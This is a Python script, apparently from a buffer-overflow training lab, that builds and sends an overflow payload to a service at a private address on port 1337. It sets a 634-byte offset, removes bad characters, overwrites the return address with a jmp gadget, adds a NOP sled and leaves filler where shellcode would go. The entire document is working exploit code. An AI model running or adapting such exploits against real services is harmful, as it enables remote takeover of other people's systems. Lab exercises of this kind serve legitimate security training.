#!/usr/bin/env python3

import socket, struct
host, port = '10.10.100.108', 1337
command = b'OVERFLOW2 '
offset = 634
def p32(data):
        return struct.pack("<I", data)

length = 1000
all_chars = bytearray(range(1,256))
bad_chars = [
b'\x23',
b'\x3c',
b'\x83',
b'\xba'
]
jmp_ebx = p32(0x625011AF)
nop_sled = b'\x90' * 24

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

payload = b''.join(
        [
        command,
        b'A' * offset,
        jmp_ebx,
        nop_sled,
        b'C' * (length - offset - len(jmp_ebx)),
        ])

with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
